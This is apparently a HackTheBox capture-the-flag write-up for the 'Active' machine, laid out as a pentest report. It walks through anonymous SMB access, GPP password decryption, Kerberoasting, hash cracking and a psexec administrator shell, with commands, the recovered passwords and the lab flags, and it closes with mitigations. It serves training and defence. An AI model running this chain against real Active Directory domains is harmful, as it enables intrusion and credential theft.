# Active HTB

## 🎯 Executive Summary

This report documents the complete penetration testing engagement against the **Active** machine from HackTheBox. The assessment revealed critical security vulnerabilities in an Active Directory environment, leading to complete domain compromise through improper Group Policy Preferences configuration and Kerberoasting attacks.

**Key Findings:**
- 🔓 Exposed SMB shares with anonymous access
- 🔐 Group Policy Preferences containing encrypted credentials
- 🎫 Kerberoastable service accounts
- 💀 Domain administrator compromise

## 🔍 Methodology

### Initial Reconnaissance

```bash
# Set target IP
export target=10.129.24.27

# Comprehensive port scan
sudo nmap -p- --min-rate 1000 -sT -vvv $target

# Service version detection
sudo nmap -sC -sV -p 53,88,135,139,445,464,539,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49162,49167,49168 -T4 $target
```

<img width="307" height="98" alt="image" src="https://github.com/user-attachments/assets/0dcf1fb0-c01c-410d-9870-7f22820aa947" />

<img width="523" height="595" alt="image" src="https://github.com/user-attachments/assets/1221ba36-b85b-46e4-9afb-18e16519f434" />

<img width="953" height="864" alt="image" src="https://github.com/user-attachments/assets/bf823f84-f17c-4f93-b2cc-bcd448c3510e" />

**Port Scan Results:**
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds
464/tcp   open  kpasswd5?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
49162/tcp open  msrpc         Microsoft Windows RPC
49167/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC
```

**Domain Identified:** `active.htb`

## 🕵️‍♂️ Vulnerability Assessment

### SMB Enumeration

```bash
# SMB share enumeration
smbmap -H 10.129.24.27 2>/dev/null
```

<img width="848" height="196" alt="image" src="https://github.com/user-attachments/assets/db9be15f-c349-4c2e-88bd-f1cded9a7294" />

**SMB Share Discovery:**
- **Replication** - Readable with anonymous access
- **Users** - Requires authentication

### Initial Access via GPP Misconfiguration

```bash
# Anonymous access to Replication share
smbclient -N -U ""%"" //10.129.24.27/Replication

# Download all files recursively
smb: \> prompt OFF
smb: \> recurse ON
smb: \> mget *
```

<img width="953" height="568" alt="image" src="https://github.com/user-attachments/assets/f7e84f15-5369-4edd-b7eb-acc1b602dca4" />

**Critical Finding - Groups.xml:**
```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
    <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" 
          name="active.htb\SVC_TGS" 
          image="2" 
          changed="2018-07-18 20:46:06" 
          uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
        <Properties action="U" 
                   newName="" 
                   fullName="" 
                   description="" 
                   cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" 
                   changeLogon="0" 
                   noChange="1" 
                   neverExpires="1" 
                   acctDisabled="0" 
                   userName="active.htb\SVC_TGS"/>
    </User>
</Groups>
```

<img width="957" height="185" alt="image" src="https://github.com/user-attachments/assets/3f842fec-10c0-4440-9b20-b6699c2dd802" />

## 💥 Exploitation

### GPP Password Decryption

```bash
# Decrypt GPP password
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```

**Credentials Obtained:**
- **Username:** `SVC_TGS`
- **Password:** `GPPstillStandingStrong2k18`

### User Access & Flag Capture

```bash
# Enumerate SMB shares with credentials
smbmap -H 10.129.24.27 -u SVC_TGS -p 'GPPstillStandingStrong2k18'

# Access Users share
smbclient -U "SVC_TGS"%"GPPstillStandingStrong2k18" //10.129.24.27/Users

# Retrieve user flag
smb: \SVC_TGS\Desktop\> get user.txt
```

<img width="841" height="191" alt="image" src="https://github.com/user-attachments/assets/0d85e7bb-db76-4894-b188-68e2e0d61eb7" />

<img width="893" height="881" alt="image" src="https://github.com/user-attachments/assets/67747491-f063-4592-87df-3ecad19a79ee" />

**User Flag:** `afdcbeca784c889a660b269080541380`

## 🚀 Privilege Escalation

### Kerberoasting Attack

```bash
# Check for Kerberoastable accounts
impacket-GetUserSPNs -request -dc-ip 10.129.24.27 active.htb/SVC_TGS:'GPPstillStandingStrong2k18'
```

<img width="960" height="566" alt="image" src="https://github.com/user-attachments/assets/3108b07d-4d23-467a-9d89-7c287e2b6b5c" />

**Administrator TGS Ticket Obtained:**
```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$c82cd09a6fcddc71588a1d634f4786ba$2c160ea2bdf1ff1f3b303b010d31f1a23cac9a48a67f5472f9fb4f8462be68bace41e6d3d9bdfe976c318207f2b909ad465503476d1ff7092ebfcd3034d1a5ce623b388017db00c108145334c4b81535c1bc9c4461a08c6a0fa27c7763fd68ba7e5d6481996e8e26f42a5c9f9600ecb72adf3c522236bffef59fcb4f132bf76ef02415dcccde16301cef4223fb21254c312dbf4a3a97dad1334bc12a13f18bd68401ff8b8ac4ae087898c40badeec28ad4dac1eb4e2ea90def268d038a8e7852b8fb38892db8cfe9e631d4663ebde24e974ba6746b696dcc59ef8461dd6a27daa4fb06bf902f580258e70eb2501e93081a6663ce93db406fe686a15db6d76f98ae4375af7c5460052921ba8d855f7b2054ca6e78a8f174d81918d68962fb312d439b864985aa43b7eae00833f41ce1a6b8c1d7bc1c4d22e55679aaf7621df76b1742aaa6bb5fd6ca7af193847f6f09da6ef92cf2fbff7152edf5e45934401708288d0534e3b64f007a3a7cbd6ed774f68f19ea23fd390fe345f7262e43ebd7dbb04865115ef4fbd5c09dfb758ac73aa86cbfa5896780f5977aa856fbd247f1e08e105d4c0b9c7c0874a2c22d927653b78d5dd1651808622e9e2900fa20675331e9e08db7d3f0eab3409afc13aa2cdf47f0ec9c0dec126f3db8b1f9be21ad4ec456dfd38efd28174c253ac82ec1ece3287ab2687562f23bc3c7b76bcc2263bc127217735ba75b07895df69047d8992a9f689e15491f273bd954fe85431a7b60dbfe528a2fd74abd8cacfd289fd4607f00e67e5b33de3b281297336ead888465222f7f069e2463dc85401d1be50a58d41988ba6194247d876b80cb2acbfc319509d5cabb72dfcd338f4a1126987c694d586523c1fc9f04f39bd09823dd2ee3d4ff99ea8de0c3484ebc62de5c9642743a55d417bbc5b94d65c8a05596b4aeaa0880f41cd615bc115fadf2a86411569760ebe4152bca87dff9bab9f55d777afcfda21ec71a3dc67f9870ec953243f1e92af8e1830ef22ac11ec85e9f821fc9abcb64262fbffc3da78e49479425c66fdeec6026bbca26ac87f665b1fd0d91e6c919f8b162dbbb52d57534bc9bfaa58faa377fc895efe6971f63ceaf2dcd57c6a4ce2fbee16a0cc6b04b93807def450cf6942bcab0f243c57ad62f95f35bc3995e487a43f0f9cdd1840dc650af8ac715275a7ff376894089671a530460d8af72a14b9462ce01e5bf979885044410c8d528de54229f9d8b5f09970c57f9
```

### Hash Cracking

```bash
# Crack the Kerberoasted hash
hashcat -m 13100 -a 0 hash /usr/share/wordlists/rockyou.txt
```

<img width="958" height="934" alt="image" src="https://github.com/user-attachments/assets/c6c7bf31-4741-4c67-8604-35270d481b93" />

**Cracked Administrator Password:** `Ticketmaster1968`

## 🏴 Post-Exploitation

### Domain Administrator Access

```bash
# Gain administrative shell
impacket-psexec active.htb/Administrator:'Ticketmaster1968'@10.129.24.27
```

### Root Flag Capture

```cmd
C:\Users\Administrator\Desktop> type root.txt
```

<img width="685" height="738" alt="image" src="https://github.com/user-attachments/assets/7e1a7a85-45c7-4dd2-83cd-58166858776d" />

**Root Flag:** `53e0fb9c6137970df9354ca30232429f`

## 🛡️ Mitigation Recommendations

### Critical Issues:

1. **Group Policy Preferences with Passwords**
   - ❌ **Issue:** Storing credentials in Group Policy Preferences
   - ✅ **Solution:** Remove all GPP files containing cpassword attributes
   - ✅ **Alternative:** Use Group Managed Service Accounts (gMSA)

2. **SMB Share Permissions**
   - ❌ **Issue:** Anonymous access to Replication share
   - ✅ **Solution:** Restrict SMB share permissions to authenticated users only

3. **Kerberoastable Accounts**
   - ❌ **Issue:** Service accounts with weak passwords vulnerable to Kerberoasting
   - ✅ **Solution:** 
     - Use strong, complex passwords for service accounts
     - Implement Managed Service Accounts
     - Regular password rotation policies

4. **Privileged Account Security**
   - ❌ **Issue:** Administrator account with crackable password
   - ✅ **Solution:** 
     - Implement LAPS (Local Administrator Password Solution)
     - Enable multi-factor authentication
     - Regular security awareness training

### Security Hardening:

- Enable SMB signing and encryption
- Implement network segmentation
- Regular security audits and penetration testing
- Monitor for Kerberoasting attempts
- Deploy EDR solutions with behavioral detection

### Tools used

* **Nmap**
* **SMBMap**
* **SMBClient**
* **GPP-Decrypter**
* **Impacket-GetUserSPNs**
* **Hashcat**
* **Impacket-PsExec**

---

*This report is for educational purposes only. Always ensure you have proper authorization before conducting security assessments.*

<style> body { background-color: #0a0a0a; color: #ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; margin: 0; padding: 20px; } .container { max-width: 1200px; margin: 0 auto; background: #1a1a1a; padding: 30px; border-radius: 10px; border: 1px solid #333; } h1, h2, h3 { color: #00ff00; border-bottom: 2px solid #333; padding-bottom: 10px; } h1 { text-align: center; color: #00ff00; font-size: 2.5em; margin-bottom: 30px; } .header-section { text-align: center; margin-bottom: 40px; padding: 20px; background: #151515; border-radius: 8px; border-left: 4px solid #00ff00; } .difficulty-badge { display: inline-block; padding: 5px 15px; background: #ffa500; color: #000; border-radius: 20px; font-weight: bold; margin: 10px 0; } .severity-badge { display: inline-block; padding: 5px 15px; background: #ff4444; color: #fff; border-radius: 20px; font-weight: bold; margin-left: 10px; } .tech-tag { background: #333; color: #00ff00; padding: 4px 12px; border-radius: 15px; font-size: 0.9em; margin: 5px 5px 5px 0; display: inline-block; border: 1px solid #00ff00; } /* Target only code blocks with triple backticks and bash */ pre { background: #ffffff; border: 1px solid #333; border-left: 4px solid #00ff00; padding: 15px; overflow-x: auto; margin: 20px 0; border-radius: 5px; color: #000000; } /* Make sure code inside pre inherits the BLACK text color */ pre code { color: #000000; background: transparent; font-family: 'Courier New', monospace; } /* Inline code (single backticks) */ code { color: #00ff00; background: #151515; padding: 2px 6px; border-radius: 3px; font-family: 'Courier New', monospace; } .image-container { text-align: center; margin: 20px 0; padding: 10px; background: #151515; border-radius: 8px; border: 1px solid #333; } .image-container img { max-width: 100%; height: auto; border: 1px solid #444; border-radius: 5px; } .vulnerability-list { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #ff4444; margin: 20px 0; } .vulnerability-list li { margin: 10px 0; padding-left: 10px; } .attack-chain { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #007bff; margin: 20px 0; } .tools-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; } .tool-item { background: #151515; padding: 15px; border-radius: 8px; text-align: center; border: 1px solid #333; } .tool-item:hover { border-color: #00ff00; transform: translateY(-2px); transition: all 0.3s ease; } /* Scrollbar Styling */ ::-webkit-scrollbar { width: 8px; } ::-webkit-scrollbar-track { background: #1a1a1a; } ::-webkit-scrollbar-thumb { background: #00ff00; border-radius: 4px; } ::-webkit-scrollbar-thumb:hover { background: #00cc00; } /* Responsive Design */ @media (max-width: 768px) { .container { padding: 15px; margin: 10px; } h1 { font-size: 2em; } .tools-grid { grid-template-columns: 1fr; } } /* Animation for headers */ h2, h3 { position: relative; } h2::after, h3::after { content: ''; position: absolute; bottom: -2px; left: 0; width: 0; height: 2px; background: #00ff00; transition: width 0.3s ease; } h2:hover::after, h3:hover::after { width: 100%; } </style>
